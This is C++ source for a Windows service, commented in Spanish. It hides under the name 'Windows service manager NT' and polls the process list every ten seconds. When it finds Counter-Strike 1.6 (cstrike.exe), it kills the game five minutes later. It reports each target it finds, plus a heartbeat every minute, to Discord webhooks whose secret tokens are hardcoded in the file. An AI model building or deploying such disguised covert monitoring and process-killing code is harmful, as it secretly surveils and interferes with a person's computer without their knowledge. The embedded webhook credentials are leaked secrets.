#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <httplib.h>
#include <nlohmann/json.hpp>
#include <chrono>
#include <string>
#include <thread>
#include <tchar.h>
#include <stdio.h>

SERVICE_STATUS_HANDLE g_ServiceHandle = nullptr;
SERVICE_STATUS g_ServiceStatus = {0};

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD control);

bool mensaje(std::string contenido, int hook_selector)
{
    std::string hook;
    switch (hook_selector)
    {
    case 1:
        hook = "/api/webhooks/1357096307088687125/h8kC6kuEJvdprbXUb7b2lk-FYxnJgR--_zIdKHeRw9iR6ekhlc7g5ASBArtT9jb66rN7";
        break;
    case 2:
        hook = "/api/webhooks/1357096443147452446/CrX6-HD3D5gFGrJaTL0Dw1FLITrTch4CRAcTKwx9NmDnIPQSkumWkCQg7RgZS35CgcTt";
        break;
    default:
        hook = "/api/webhooks/1357088167605567498/rsHfOStma2MgPpctH2BWNbYApOEZKMzVFiSozCfrVlcHGluYTqIL70nIHFVr1jvOsKnW";
        break;
    }

    try
    {
        httplib::Client Server("https://discord.com");
        nlohmann::json payload = {{"content", contenido}, {"username", std::getenv("IDENTIFICADOR_UNICO")}};
        auto res = Server.Post(hook.c_str(), payload.dump(), "application/json");
        return res ? true : false;
    }
    catch (const std::exception &e)
    {
        return false;
    }
}

bool kill(int PID)
{
    std::this_thread::sleep_for(std::chrono::minutes(5));
    HANDLE HProceso = OpenProcess(PROCESS_TERMINATE, FALSE, PID);
    if (HProceso == NULL)
    {
        return false;
    }
    if (TerminateProcess(HProceso, 0))
    {
        CloseHandle(HProceso);
        return true;
    }
    CloseHandle(HProceso);
    return false;
}

void Alive()
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::minutes(1));
        mensaje("```\nSTATUS: LIVE\n```", 2);
    }
}

int main()
{
    SERVICE_TABLE_ENTRY serviceTable[] = {
        {(LPSTR) "Windows service manager NT", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}};
    if (!StartServiceCtrlDispatcher(serviceTable))
    {
        return 1;
    }
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    PROCESSENTRY32 proceso;
    nlohmann::json LISTA_PROCESOS;

    g_ServiceHandle = RegisterServiceCtrlHandler(TEXT("Windows service manager NT"), ServiceCtrlHandler);
    if (!g_ServiceHandle)
    {
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);

    mensaje("```\nEstod: Recien encendido\n```", 1);

    std::thread Estado(Alive);
    Estado.detach();

    while (true)
    {
        LISTA_PROCESOS.clear();
        HANDLE HSnapShoot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (HSnapShoot == INVALID_HANDLE_VALUE)
        {
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);
            return;
        }

        proceso.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(HSnapShoot, &proceso))
        {
            do
            {
                LISTA_PROCESOS[proceso.szExeFile] = proceso.th32ProcessID;
            } while (Process32Next(HSnapShoot, &proceso));
        }

        CloseHandle(HSnapShoot);

        std::string procesoBuscado = "cstrike.exe";
        if (LISTA_PROCESOS.find(procesoBuscado) != LISTA_PROCESOS.end())
        {
            int PID = LISTA_PROCESOS[procesoBuscado];
            std::string mensajeContenido = "```\nOBJETIVO ENCONTRADO: " + std::to_string(PID) + "\n Pendiente de cerrar en 5 Minutos\n```";
            mensaje(mensajeContenido, 1);
            if (kill(PID))
            {
                mensajeContenido = "```\nMSG: CS.1.6: DETENIDO\n```";
            }
            else
            {
                mensajeContenido = "```\nMSG: CS.1.6: FALLO AL DETENER\n```";
            }
            mensaje(mensajeContenido, 1);
        }

        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD control)
{
    if (control == SERVICE_CONTROL_STOP)
    {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);

        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_ServiceHandle, &g_ServiceStatus);
    }
}